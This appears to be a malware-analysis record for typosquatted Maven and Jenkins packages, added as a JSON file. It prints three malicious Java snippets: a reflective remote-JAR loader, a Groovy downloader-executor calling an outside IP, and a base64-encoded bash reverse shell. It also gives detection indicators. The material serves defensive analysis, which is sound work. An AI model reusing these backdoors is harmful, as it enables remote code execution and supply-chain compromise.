@@ -1,0 +1,139 @@
+{
+  "package_info": {
+    "package_name": "com.github.codingandcoding (maven-compiler-plugin, mail-watcher-plugin, servlet-api)",
+    "package_manager": "Maven",
+    "package_versions": "maven-compiler-plugin: 3.9.0; mail-watcher-plugin: 1.16, 1.17; servlet-api: 3.2.0",
+    "why_malicious": "These packages are brandjacking and typosquatting attacks that impersonate legitimate Maven and Jenkins plugins. Each contains backdoored code that downloads and executes arbitrary code from attacker-controlled C2 servers, enabling remote code execution, system compromise, and persistent access. The malicious payloads are triggered during normal plugin operations, targeting both developer machines and CI/CD build servers, and can propagate supply chain attacks."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (plugin execution during Maven build process)",
+        "file_location": "CompilerMojo.class (execute() method) in maven-compiler-plugin",
+        "required_permissions": [
+          "network (outbound HTTP)",
+          "filesystem (write/read JARs)",
+          "classloader (reflection, dynamic class loading)"
+        ]
+      },
+      "code_snippet": "public void execute() throws MojoExecutionException, CompilationFailureException {\n    URLClassLoader loader = (URLClassLoader) ClassLoader.getSystemClassLoader();\n    Class urlclassloaderClass = URLClassLoader.class;\n    URL url = null;\n    try {\n        url = new URL(\"http://swmail.malware.index/evilmaven.jar\");\n        Method m = urlclassloaderClass.getDeclaredMethod(\"addURL\", new Class[]{URL.class});\n        m.setAccessible(true);\n        m.invoke(loader, new Object[]{url});\n        Class.forName(\"com.swmail.hac.Main\", true, loader);\n    } catch (Exception e) {\n        e.printStackTrace();\n    }\n}",
+      "code_language": "java",
+      "code_behavior": "During Maven build execution, this code downloads a remote JAR file from a hardcoded C2 server (http://swmail.malware.index/evilmaven.jar), dynamically loads it into the JVM using reflection, and executes a class from the downloaded JAR, enabling arbitrary code execution under the build process context.",
+      "malice_analysis": {
+        "why_suspicious": "The code uses reflection to bypass normal classloader restrictions and loads code from an untrusted, hardcoded external URL, which is a classic remote code execution backdoor technique. This allows attackers to execute arbitrary code on any system running the plugin.",
+        "violated_expectations": "A legitimate Maven compiler plugin should never download or execute code from the internet during build execution. All dependencies should be resolved through trusted Maven repositories, not arbitrary URLs.",
+        "similar_legitimate_use": "Dynamic plugin loading is only legitimate when performed from trusted, signed repositories and with explicit user consent. Loading code from arbitrary URLs is never acceptable in production plugins.",
+        "key_indicators": [
+          "Hardcoded external URL (http://swmail.malware.index/evilmaven.jar)",
+          "Reflection to invoke addURL on URLClassLoader",
+          "Dynamic class loading (Class.forName) from downloaded JAR",
+          "No user interaction or consent required",
+          "Execution occurs during normal Maven build process"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (mail notification event in Jenkins)",
+        "file_location": "MailWatcherNotification.class (send() method) in mail-watcher-plugin",
+        "required_permissions": [
+          "network (outbound HTTP)",
+          "filesystem (write to /tmp)",
+          "groovy interpreter (GroovyShell execution)"
+        ]
+      },
+      "code_snippet": "public final void send() {\n    try {\n        Binding binding = new Binding();\n        GroovyShell shell = new GroovyShell(binding);\n        int bytesum = 0;\n        int byteread = 0;\n        try {\n            URL url = new URL(\"http://112.11.168.47/evil.groovy\");\n            URLConnection conn = url.openConnection();\n            InputStream inStream = conn.getInputStream();\n            FileOutputStream fs = new FileOutputStream(\"/tmp/evil.groovy\");\n            byte[] buffer = new byte[1024];\n            int length;\n            String getShell = \"\";\n            while ((byteread = inStream.read(buffer)) != -1) {\n                bytesum += byteread;\n                fs.write(buffer, 0, byteread);\n                getShell += new String(buffer);\n            }\n            Object value = shell.evaluate(getShell);\n            System.out.println(value.toString());\n        } catch (Exception e) {}\n    } catch (Exception e) {}\n}",
+      "code_language": "java (with Groovy)",
+      "code_behavior": "On mail notification events in Jenkins, this code downloads a Groovy script from a hardcoded C2 server (http://112.11.168.47/evil.groovy), writes it to /tmp/evil.groovy, and immediately evaluates it using GroovyShell, executing arbitrary attacker-supplied code on the Jenkins server.",
+      "malice_analysis": {
+        "why_suspicious": "Fetching and executing code from an untrusted remote server is a direct code execution backdoor. The use of GroovyShell to evaluate attacker-controlled scripts enables full remote code execution on the Jenkins server.",
+        "violated_expectations": "A mail notification plugin should only handle email notifications and never download or execute remote scripts. Executing arbitrary code in response to notification events is a severe violation of expected plugin behavior.",
+        "similar_legitimate_use": "Automated script updates from trusted, signed sources are extremely rare and never appropriate for notification plugins. GroovyShell evaluation should only be used for trusted, static scripts.",
+        "key_indicators": [
+          "Hardcoded external URL (http://112.11.168.47/evil.groovy)",
+          "GroovyShell evaluation of downloaded code",
+          "Writes attacker-supplied script to /tmp/evil.groovy",
+          "Execution triggered by mail notification event",
+          "No validation or signature checking of downloaded script"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_3",
+      "execution_context": {
+        "trigger": "runtime (HTTP GET request to web application)",
+        "file_location": "HttpServlet.class (doGet() method) in servlet-api",
+        "required_permissions": [
+          "network (outbound connection)",
+          "process execution (Runtime.exec)",
+          "shell access (bash execution)"
+        ]
+      },
+      "code_snippet": "protected void doGet(HttpServletRequest req) throws ServletException, IOException {\n    Runtime.getRuntime().exec(\"bash -c $(echo 'YmFzaCAtcSA+J19KZXYvdGNwLzQ1Ljg3LjEyMi41NC84ODg4IDA+JjE='|base64 -d)|bash -i\");\n}",
+      "code_language": "java (with embedded shell command)",
+      "code_behavior": "On every HTTP GET request, this servlet decodes a base64-encoded string to obtain a bash reverse shell command, then executes it, causing the server to connect back to the attacker's IP (45.87.122.54:8888) and provide remote shell access.",
+      "malice_analysis": {
+        "why_suspicious": "The code executes a base64-decoded reverse shell command on every HTTP GET request, providing the attacker with persistent remote shell access. This is a severe and overt backdoor.",
+        "violated_expectations": "A servlet API should never execute shell commands or open network connections to untrusted hosts. Servlets are expected to handle HTTP requests, not spawn shells or connect to external IPs.",
+        "similar_legitimate_use": "There is no legitimate use case for reverse shell execution in servlet APIs. Process execution in servlets is extremely rare and should be tightly controlled and audited.",
+        "key_indicators": [
+          "Base64-encoded payload containing shell command",
+          "Reverse shell command targeting 45.87.122.54:8888",
+          "Use of Runtime.getRuntime().exec to spawn shell",
+          "Executes on every HTTP GET request",
+          "No authentication or input validation"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "User or build system installs and executes the malicious plugin/component, mistaking it for a legitimate one due to brandjacking or typosquatting.",
+      "implemented_by": [],
+      "leads_to": "Malicious code is triggered during normal plugin/component operation, such as build execution, mail notification, or HTTP request handling."
+    },
+    {
+      "step": 2,
+      "action": "Malicious code downloads and executes attacker-controlled payloads or opens a reverse shell, enabling remote code execution.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Remote code execution or shell access for the attacker on the compromised system."
+    },
+    {
+      "step": 3,
+      "action": "Attacker gains persistent access, can exfiltrate data, run arbitrary commands, or pivot to further attacks within the environment.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2",
+        "snippet_3"
+      ],
+      "leads_to": "Full system compromise, potential for supply chain attack propagation to downstream users or systems."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Plugins or components downloading and executing code from hardcoded external URLs during build or runtime",
+      "Use of reflection to dynamically load JARs from untrusted sources",
+      "GroovyShell evaluation of scripts fetched from remote servers",
+      "Base64-decoded shell commands executed at runtime within servlet or plugin code",
+      "Reverse shell connections initiated by Java processes in response to HTTP requests or plugin events"
+    ],
+    "file_indicators": [
+      "Presence of /tmp/evil.groovy on Jenkins or build servers",
+      "Unexpected modifications or additions to plugin JARs (CompilerMojo.class, MailWatcherNotification.class, HttpServlet.class)",
+      "JARs with SHA1 hashes: a52a4d23429861a16cfa621945096b14b60746f6, 08e7183a431683c3d516e7687552055326b03948, 0a682f3304b6cea152aa5e2812d59850680265fb, c018607d8597ba2b9e64561518b9dfbb65ff9f2b"
+    ],
+    "network_indicators": [
+      "Outbound HTTP connections to swmail.malware.index",
+      "Outbound HTTP connections to 112.11.168.47",
+      "Reverse shell connections to 45.87.122.54:8888"
+    ],
+    "how_to_detect": "Monitor for plugins or components that initiate outbound network requests to untrusted domains or IPs, especially during build, plugin execution, or HTTP request handling. Flag any use of reflection-based dynamic class loading, GroovyShell evaluation of remote scripts, or base64-decoded shell execution in plugin/component code. Alert on the presence of suspicious files such as /tmp/evil.groovy and on reverse shell connections initiated by Java processes. Use hash-based detection for known malicious JARs and monitor for unexpected changes to plugin classes."
+  }
+}
